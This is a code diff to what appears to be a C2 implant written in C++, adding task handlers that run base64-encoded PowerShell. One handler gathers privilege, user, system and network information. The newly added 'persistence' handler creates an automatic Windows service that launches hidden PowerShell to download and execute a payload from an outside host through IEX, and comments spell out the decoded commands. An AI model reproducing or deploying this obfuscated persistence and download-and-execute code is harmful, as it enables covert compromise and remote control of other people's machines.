@@ -103,12 +103,20 @@ bool runTask(string outBuffer, DWORD dwSize)
                 << "Error: " << e.what() << "\n";
         }
 
-        currentSleep = seconds * 10000 ? seconds : currentSleep;
+        currentSleep = seconds * 100000 ? seconds : currentSleep;
     }
     else if (cmd == "systemprofile")
     {
         string encodedCommand{"dwBoAG8AYQBtAGkAIAAvAHAAcgBpAHYAOwB3AGgAbwBhAG0AaQAgAC8AZwByAG8AdQBwAHMAOwBuAGUAdAAgAHUAcwBlAHIAOwBzAHkAcwB0AGUAbQBpAG4AZgBvADsAZwBlAHQALQBwAHIAbwBjAGUAcwBzADsAaQBwAGMAbwBuAGYAaQBnAA=="};
         // [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("whoami /priv;whoami /groups;net user;systeminfo;get-process;ipconfig"))
+        runEncodedPSCommand(encodedCommand);
+    }
+    else if (cmd == "persistence")
+    {
+        string encodedCommand{"TgBlAHcALQBTAGUAcgB2AGkAYwBlACAALQBOAGEAbQBlACAAJwBQAGUAcgBzAGkAcwB0AGUAbgBjAGUAJwAgAC0AQgBpAG4AYQByAHkAUABhAHQAaABOAGEAbQBlACAAJwBDADoAXABXAGkAbgBkAG8AdwBzAFwAUwB5AHMAdABlAG0AMwAyAFwAYwBtAGQALgBlAHgAZQAgAC8AYwAgAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAgAC0AbgBvAHAAIAAtAHcAIABoAGkAZABkAGUAbgAgAC0AYwAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAwADoAOAAwADgAMAAvAG0AYQBpAG4ALgBlAHgAZQApACcAIAAtAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAgACcASgBtAGMAYQBDADIAUABlAHIAcwBpAHMAdABlAG4AYwBlACcAIAAtAFMAdABhAHIAdAB1AHAAVAB5AHAAZQAgAEEAdQB0AG8AbQBhAHQAaQBjAA=="};
+        //  $cmd="New-Service -Name 'Persistence' -BinaryPathName 'C:\Windows\System32\cmd.exe /c powershell.exe -nop -w hidden -c IEX
+        // (New-Object Net.WebClient).DownloadString(http://192.168.1.100:8080/main.exe)' -Description 'JmcaC2Persistence' -StartupType Automatic"
+        // DELETE FOR TESTING : (Get-WmiObject -Class Win32_Service -Filter "Name='Persistence'").delete()
         runEncodedPSCommand(encodedCommand);
     }
 
